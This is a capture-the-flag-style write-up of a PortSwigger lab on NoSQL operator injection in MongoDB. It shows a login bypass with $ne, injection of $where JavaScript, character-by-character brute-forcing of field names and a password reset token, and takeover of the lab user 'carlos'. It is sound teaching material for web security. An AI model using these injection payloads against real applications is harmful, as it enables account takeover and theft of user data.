## Overview :

#### Identifying field names

Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection. 

For example, to identify whether the MongoDB database contains a **password** field, you could submit the following payload:
```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the **username field exists**, so you could send the following payloads:
```
admin' && this.username!='
```

```
admin' && this.foo!='
```

> **If the password field exists, you'd expect the response to be identical to the response for the existing field (username)**, but different to the response for the field that doesn't exist (foo). 

#### Exploiting NoSQL operator injection to extract data ?

_Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself_. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via `this` operator.

#### Extracting field names

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:
```nosql
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

> This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character. 

## Solution :

Try to login with carlos & some random password. The following is hte request being sent.

```http
POST /login HTTP/1.1
Host: 0aed0048046cb4b984524c2d00d400a3.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aed0048046cb4b984524c2d00d400a3.web-security-academy.net/login
Content-Type: application/json
Content-Length: 39
Origin: https://0aed0048046cb4b984524c2d00d400a3.web-security-academy.net
Connection: close

Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
"username":"carlos",
"password":"asfd"
}
```

Modify the request by adding `{"$ne" : "invalid"}` in the password field & see if we can bypass the login of carlos.
```json
{
"username":"carlos",
"password":{"$ne" :"invalid"}
}
```
But we get a response saying that **Account is locked.Please reset the password**.

#### Injecting $where operator in JSON body -

- Injecting `"$where" : "1"`

**Request -**
```json
{
"username":"carlos",
"password":{"$ne" :"invalid"},
"$where": "1"
}
```
**Response -**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/80d73400-e5a0-4a74-9560-3c40deefdfa7)

Here we get **Account locked** in response.

- Injecting `"$where" : "0"`

**Request -**
```json
{
"username":"carlos",
"password":{"$ne" :"invalid"},
"$where": "0"
}
```

**Response -**

Here we get a different response - **Invalid username/password.**

### Extracting available field names -

Send the above request to repeater.

- Replace the `$where` parameter with this `"$where":"Object.keys(this)[0].match('^.{}.*')"` .
- Add 2 payload positions to bruteforce - `"$where":"Object.keys(this)[0].match('^.{§§}§§.*')"`

> 1. `"$where"`: This is a key in a JSON object, and it seems to be used to define a condition or filter.
>
> 2. "`Object.keys(this)[0]"`: This part of the expression is JavaScript code, not a regular expression. It's using the **Object.keys(this)** function to get an array of keys of the current object (this), and then [0] is used to access the first key in that array. So, it's essentially accessing the first key in the current object.


Set Attack Type - Cluster Bomb
Payload 1 - Numbers from 0-20
Payload 2 - Simple list - `a-z`, `A-Z`, `0-9`

Once the attack is over, sort **Payload1** & **Length** to find the **1st key field which is `id`**.

- Repeat the attack by changing hte position from 1 to 2 in the array - `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`

This time we got the **value of 2nd key - `username`**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ce4971c0-1c82-4845-8570-bccdee692244)


- Repeat the process for **3nd key field**, we got the value of 3rd field as - `password`

- Repeat the process for 4th key field, we got the value of 4th field as - `newpwdTkn`

> **Before bruteforcing the 4th field (which most probably is the password reset field), make sure to send a password reset link for carlos before performing the bruteforce for 4th field.** Else you will get `500 Internal server error` when you bruteforce.

### Bruteforcing the password reset token -

So where can we use the following fields which we identified? Possibly the **forgot-password** request.

Send the *GET /forgot-password* request to repeater. Add the parameter **?newpwdTkn=<invalid-token>**.In the response, we get **Invalid token** as expected.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d2bab9d7-ae07-4342-b4e6-80ec4783cfee)

Now we need to bruteforce and find the _newPwdTkn_ value

Now update the *where* operator in the intruder tab as follows ,
```json
"$where":"this.newpwdTkn.match('^.{§§}§§.*')"
```
Start the attack.

Now we got the value of the token  - `**d977a5180c87a6a8**`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/47508caf-a1ae-48ea-a473-af1e597a76f2)

### Reset carlos's password using the token -

Use the url to reset carlos's password - https://0af8009a03483ec483bd199400c3006c.web-security-academy.net/forgot-password?newPwdTkn=d977a5180c87a6a8

In this case , I modified it to `test`.

Now login as carlos to solve the lab.
